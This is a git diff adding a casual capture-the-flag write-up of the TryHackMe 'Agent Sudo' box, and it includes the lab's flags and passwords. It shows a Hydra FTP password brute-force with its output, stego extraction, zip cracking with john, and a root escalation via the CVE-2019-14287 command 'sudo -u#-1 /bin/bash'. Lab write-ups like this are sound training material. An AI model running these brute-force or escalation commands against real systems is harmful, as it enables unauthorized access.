@@ -1,0 +1,190 @@
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R 
+
+//cool we have to change our user-agent...to codename? nope
+//agent R? R? yeah R gave us something
+
+What are you doing! Are you one of the 25 employees? If not, I going to report this incident 
+
+//lol so there are 25 employees and you cant be R...ok its a letter of the alphabet...lets FUZZ
+
+//A...B..C..is easy its like counting up to 3...sing a single melody...
+
+//only C and R have different content-lenght..and we cannot be R so...yeah
+
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R 
+
+//there is always a chris in your team...he always do that
+
+//seems like the bruteforce is strong in here
+
+//ftp :
+$hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.185.167 ftp
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-04 17:21:40
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.10.185.167:21/
+[21][ftp] host: 10.10.185.167   login: chris   password: crystal
+[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 9 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-04 17:22:58
+
+//chris:crystal
+
+
+//ok we grab all the stuff
+ftp> mget *
+
+
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+
+//why do those people do that?? lol lets get into stegano
+
+//first are those really pictures?
+
+$file *
+
+cute-alien.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 440x501, components 3
+cutie.png:      PNG image data, 528 x 528, 8-bit colormap, non-interlaced
+
+//there is no exif data...lets fire up steghide
+steghide --extract -sf cutie.png
+Entrez la passphrase: 
+
+
+//hmm..cutie ask a passphrase..it may be in cute-alien
+steghide --extract -sf cutie-alien.png
+Entrez la passphrase: 
+
+//geez no...ok after alot of google  binwalk it is
+
+$binwalk cute-alien.jpg
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+┌─[nair0lf32@zer0ne]─[~/Desktop/Stuff/THM/Agent Sudo]
+└──╼ $binwalk cutie.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+
+//lol cutie.png got a zip archive
+
+//we got Text to agent R
+$binwalk cutie.png -e
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt  
+34820         0x8804          End of Zip archive, footer length: 22
+
+//we get a folder with password protected zip...Godammit its a bruteforce marathon as it seems
+
+//lets use zip2john then john with rockyou
+
+alien            (8702.zip/To_agentR.txt)
+
+//now we unzip the archive with password
+
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+
+//this team have communication issues 
+
+QXJlYTUx in just base 64 for  Area51
+
+//we use that final password to extract stuff from the second image with steghide
+
+steghide info cute-alien.jpg
+"cute-alien.jpg":
+format: jpeg
+	capacit�: 1,8 KB
+	Essayer d'obtenir des informations � propos des donn�es incorpor�es ? (o/n) o
+	Entrez la passphrase: 
+	fichier � inclure "message.txt":
+	taille: 181,0 Byte
+	cryptage: rijndael-128, cbc
+	compression: oui
+	
+	steghide --extract -sf cute-alien.jpg
+	Entrez la passphrase: 
+	�criture des donn�es extraites dans "message.txt".
+	
+//we got message.txt
+ssh: james:hackerrules!
+
+james@agent-sudo:~$ cat user_flag.txt
+b03d975e8c92a7c04146cfa7a5a313c7
+
+//we got ONE user_flag ONE
+
+//in same folder there is ANOTHER PICTURE dammit! I think we might need that
+$scp james@10.10.252.51:Alien_autospy.jpg /home/nair0lf32
+james@10.10.252.51's password: 
+Alien_autospy.jpg 
+
+//haha autospy..a reverse image search of the image reveals
+Roswell alien autopsy (de verdade)
+
+//time to PrivEsc
+sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+(ALL, !root) /bin/bash
+
+//wait what? lol..lets google that
+
+CVE-2019-14287
+
+//read it..understand it...do it
+sudo -u#-1 /bin/bash
+
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+
+//cool..there is a bonus for agent R identity..lets GO...
+
+//lol thats stupid its just..deskel
+
+//I was so hyped...anywway it was a fun one
+
+//ALOOOOT Of PASSWORD CRACKING
